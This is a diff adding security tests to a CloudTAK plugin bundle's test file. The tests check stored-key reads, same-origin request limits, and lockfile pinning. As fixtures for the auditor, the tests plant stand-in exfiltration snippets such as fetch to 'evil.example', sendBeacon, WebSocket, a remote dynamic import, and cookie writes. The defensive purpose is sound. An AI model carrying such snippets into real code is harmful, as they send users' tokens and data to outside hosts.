@@ -18,6 +18,8 @@ const build = read('../bundle/build.mjs');
 
 const { routeCompat, majorMinor } = await import('../bundle/compat.ts');
 const { makeTarball, makeManifest, sha256 } = await import('../bundle/pack.mjs');
+const { auditBundle, storedKeysRead } = await import('../bundle/audit.mjs');
+const { checkAgainstLock, packageOf, bundledPackages } = await import('../bundle/deps.mjs');
 
 // ---- the server part and the bundle must be the same version family ----
 
@@ -128,6 +130,121 @@ test('the std shim sends the login the way CloudTAK does and reports the status 
     }
 });
 
+// ---- Security conditions 1 and 2 (ops #1410): what the bundle reads, and where it sends ----
+
+function fakeBrowser(prefs) {
+    const reads = [];
+    globalThis.Capacitor = { Plugins: { Preferences: {
+        get: async ({ key }) => { reads.push(key); return { value: prefs[key] ?? null }; },
+        set: async () => { throw new Error('the bundle must never write a stored value'); },
+        remove: async () => { throw new Error('the bundle must never remove a stored value'); },
+    } } };
+    globalThis.location = { origin: 'https://map.cloudtak.example' };
+    const sent = [];
+    globalThis.fetch = async (url, init) => {
+        sent.push({ url: String(url), headers: init.headers });
+        return new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } });
+    };
+    return { reads, sent, done() { delete globalThis.Capacitor; delete globalThis.location; } };
+}
+
+test('condition 1: the std shim reads only the token and the server address, and writes nothing', async () => {
+    const { std, READABLE_KEYS } = await import('../bundle/shims/std.ts');
+    assert.deepEqual([...READABLE_KEYS], ['token', 'serverUrl']);
+    const b = fakeBrowser({ token: 'T0KEN', serverUrl: 'https://cloudtak.example', refresh: 'R', sessionId: 'S' });
+    try {
+        await std('/api/crosstak/health');
+        await std('/api/crosstak/send', { method: 'POST', body: { a: 1 } });
+        assert.ok(b.reads.length > 0);
+        assert.deepEqual([...new Set(b.reads)].sort(), ['serverUrl', 'token']);
+        assert.ok(b.sent.every((r) => !JSON.stringify(r).includes('"R"') && !JSON.stringify(r).includes('"S"')));
+    } finally { b.done(); }
+});
+
+test('condition 2: a request to another origin is refused before anything is sent', async () => {
+    const { std } = await import('../bundle/shims/std.ts');
+    const b = fakeBrowser({ token: 'T0KEN', serverUrl: 'https://cloudtak.example' });
+    try {
+        for (const url of ['https://evil.example/steal', 'http://cloudtak.example/api/x', 'https://cloudtak.example.evil.example/api/x', 'https://cloudtak.example:8443/api/x']) {
+            await assert.rejects(std(url), /only to your CloudTAK server/, url);
+        }
+        assert.equal(b.sent.length, 0, 'nothing went out');
+        // the server's own origin still works, as a path and as a full URL
+        await std('/api/crosstak/health');
+        await std('https://cloudtak.example/api/crosstak/health');
+        assert.deepEqual(b.sent.map((r) => r.url), ['https://cloudtak.example/api/crosstak/health', 'https://cloudtak.example/api/crosstak/health']);
+        assert.ok(b.sent.every((r) => r.headers.Authorization === 'Bearer T0KEN'));
+    } finally { b.done(); }
+});
+
+test('condition 2: with no stored server address the page origin is the server', async () => {
+    const { std } = await import('../bundle/shims/std.ts');
+    const b = fakeBrowser({ token: 'T0KEN' });
+    try {
+        await std('/api/crosstak/health');
+        await assert.rejects(std('https://evil.example/x'), /only to your CloudTAK server/);
+        assert.deepEqual(b.sent.map((r) => r.url), ['https://map.cloudtak.example/api/crosstak/health']);
+    } finally { b.done(); }
+});
+
+// ---- the built file is read for the rules (needs no CloudTAK checkout: it reads planted code too) ----
+
+const GOOD = 'async function A(e){let t=B();if(t){let n=await t.get({key:e});return n&&n.value||void 0}try{return localStorage.getItem(`CapacitorStorage.${e}`)||void 0}catch{return}}'
+    + 'async function Y(){let a=await A("token");let u=await A("serverUrl");return fetch(u,{headers:{Authorization:`Bearer ${a}`}})}console.info("CrossTAK bundle: idle");';
+
+test('audit: a clean file passes and the two keys are found', () => {
+    assert.deepEqual(storedKeysRead(GOOD), { found: true, keys: ['serverUrl', 'token'], dynamic: 0 });
+    assert.deepEqual(auditBundle(GOOD), []);
+});
+
+test('audit: each planted break is caught (red twins of the Security conditions)', () => {
+    const planted = {
+        'another stored key': GOOD + 'A("refreshToken");',
+        'a stored key from a variable': GOOD + 'A(x+"Token");',
+        'a storage write': GOOD + 'localStorage.setItem("t",1);',
+        'a second fetch': GOOD + 'fetch("https://evil.example");',
+        'a beacon': GOOD + 'navigator.sendBeacon("/x");',
+        'a socket': GOOD + 'new WebSocket("wss://x");',
+        'a cookie': GOOD + 'document.cookie="a=1";',
+        'a dynamic import': GOOD + 'import("https://x/a.js");',
+        'a log line with a value': GOOD + 'console.log(token);',
+        'a Preferences write': GOOD + 'B().set({key:"token",value:"x"});',
+    };
+    for (const [what, code] of Object.entries(planted)) assert.notDeepEqual(auditBundle(code), [], what);
+});
+
+// ---- Security condition 4: built from the lock ----
+
+test('condition 4: the bundle dependencies are pinned exactly and the lock names them', () => {
+    const pkg = JSON.parse(read('../bundle/package.json'));
+    const lock = JSON.parse(read('../bundle/package-lock.json'));
+    assert.ok(Object.keys(pkg.dependencies).length > 0);
+    for (const [name, range] of Object.entries(pkg.dependencies)) {
+        assert.match(range, /^\d+\.\d+\.\d+$/, `${name} is pinned to one version`);
+        assert.equal(lock.packages[`node_modules/${name}`].version, range);
+    }
+    for (const [name, entry] of Object.entries(lock.packages)) {
+        if (name) assert.match(entry.integrity, /^sha512-/, `${name} has an integrity hash`);
+    }
+    assert.equal(lock.packages[''].dependencies['@tabler/icons-vue'], pkg.dependencies['@tabler/icons-vue']);
+});
+
+test('condition 4: a bundled package that the lock does not list, or lists at another version, stops the build', () => {
+    const lock = { packages: { 'node_modules/a': { version: '1.0.0', integrity: 'sha512-x' } } };
+    assert.deepEqual(checkAgainstLock([{ name: 'a', version: '1.0.0' }], lock), []);
+    assert.match(checkAgainstLock([{ name: 'a', version: '1.0.1' }], lock)[0], /lock says 1\.0\.0/);
+    assert.match(checkAgainstLock([{ name: 'b', version: '1.0.0' }], lock)[0], /not in the lock/);
+    assert.equal(packageOf('/x/bundle/node_modules/@tabler/icons-vue/dist/a.mjs'), '@tabler/icons-vue');
+    assert.equal(packageOf('/x/bundle/node_modules/foo/node_modules/bar/i.js'), 'bar');
+    assert.equal(packageOf('/x/bundle/entry.ts'), null);
+});
+
+test('condition 4: the build resolves bare imports only from bundle/node_modules', () => {
+    assert.match(build, /locked-imports\.ts/);
+    assert.match(build, /npm ci --prefix bundle/);
+    assert.doesNotMatch(build, /path\.join\(app, 'src\/main\.ts'\), \{ \.\.\.opts/);
+});
+
 // ---- the archive ----
 
 function untar(buf) {
@@ -181,6 +298,21 @@ test('the built bundle has no bare import, takes Vue from the host, and uses its
     assert.match(code, /\$\{\w+\}\/health/);
     const again = await buildBundle({ cloudtak, out: mkdtempSync(path.join(tmpdir(), 'crosstak-bundle-')) });
     assert.equal(again.indexSha256, res.indexSha256, 'same source, same bytes');
+    assert.equal(again.tgzSha256, res.tgzSha256, 'same archive bytes');
+
+    // Security conditions 1, 2 and 3 on the built file
+    assert.deepEqual(auditBundle(code), []);
+    assert.deepEqual(storedKeysRead(code).keys, ['serverUrl', 'token']);
+
+    // condition 4: the packages inside the file are the locked ones, listed for the SBOM, and the
+    // archive hash is the one the release notes carry
+    const lock = JSON.parse(read('../bundle/package-lock.json'));
+    assert.deepEqual(res.packages.map((p) => p.name), ['@tabler/icons-vue']);
+    assert.deepEqual(checkAgainstLock(res.packages, lock), []);
+    const deps = JSON.parse(readFileSync(res.depsFile, 'utf8'));
+    assert.equal(deps.bundle, `crosstak-${res.version}.tar.gz`);
+    assert.deepEqual(deps.packages, res.packages);
+    assert.equal(res.tgzSha256, sha256(readFileSync(res.tgz)));
 });
 
 test('the build script reads the version from the route file and keeps the host modules out', () => {
